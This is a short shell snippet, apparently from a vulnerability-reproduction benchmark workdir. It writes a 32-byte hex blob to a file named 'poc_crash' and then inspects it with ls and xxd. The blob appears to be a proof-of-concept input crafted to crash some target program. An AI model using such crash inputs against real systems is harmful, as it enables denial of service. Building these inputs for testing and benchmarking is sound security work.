python3 -c "open('/CybinGym_workdir/poc_crash','wb').write(bytes.fromhex('020207010000ffff200000002000000000000000da86ef6910000000fdc11ff7'))"
ls -l /CybinGym_workdir/poc_crash; xxd /CybinGym_workdir/poc_crash
